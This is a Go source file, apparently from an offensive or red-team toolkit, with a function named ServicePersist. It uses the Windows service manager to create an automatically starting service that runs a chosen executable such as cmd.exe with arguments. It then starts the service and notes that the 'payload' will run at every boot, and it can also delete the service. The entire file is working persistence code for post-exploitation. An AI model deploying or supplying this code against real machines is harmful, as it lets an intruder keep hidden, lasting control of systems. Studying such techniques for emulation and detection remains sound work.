package techniques

import (
	"fmt"
	"log"
	"golang.org/x/sys/windows/svc/mgr"
)

// main service persistence function, takes string arguments for the command to be used (in this case it should be bin path, eg. C:\Windows\System32\cmd.exe),
// arguments for the executable passed as the service bin path, the name of the service (also used for display name), and the method (add or remove)
func ServicePersist(command string, arguments string, name string, method string){
	fmt.Printf("[+] Attempting to %s the %s service\n",method,name)
	// attempts to connect to the service manager (provided by the sys/windows/svc/mgr package)
	manager,err := mgr.Connect()
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Println("[+] Connected to the manager")

	// if the method is to add, it tries to add and start the service
	if method == "add"{
		// tests if the service already exists first
		service,err := manager.OpenService(name)
		if err == nil {
			service.Close()
			fmt.Printf("[!] %s already exists as a service\n",name)
			return
		}
		// creates the new service, start type is auto so it starts at boot
		service,err = manager.CreateService(name,command,mgr.Config{DisplayName: name, StartType: mgr.StartAutomatic},arguments)
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Printf("[+] Created the %s service with the %s executable\n",name,command)
		err = service.Close()
		if err != nil {
			log.Fatalln(err)
		}
		// attempts to start the newly created service
		fmt.Printf("[+] Attempting to open the %s service\n",name)
		service,err = manager.OpenService(name)
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Printf("[+] Attempting to start the %s service\n",name)
		err = service.Start()
		if err != nil {
			// in the case that the service payload doesn't stay active, it'll present the error below
			if err.Error() == "The service did not respond to the start or control request in a timely fashion."{
				fmt.Println("[!] Service has not stayed active, but has likely run and will run at system start")
			} else {
				log.Fatalln(err)
			}
		}

	// if the method is to remove
	} else if method == "remove"{
		fmt.Printf("[+] Attempting to open the %s service\n",name)
		// makes sure it exists
		service,err := manager.OpenService(name)
		if err != nil {
			log.Fatalln(err)
		}
		// tries to delete the service
		fmt.Printf("[+] Attempting to delete the %s service\n",name)
		err = service.Delete()
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Printf("[+] Deleted the %s service\n",name)
	} else {
		fmt.Printf("[!] %s is not a valid method for service persistence\n",method)
	}

	// disconnects from the service manager
	err = manager.Disconnect()
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Println("[+] Disconnected from the manager")
}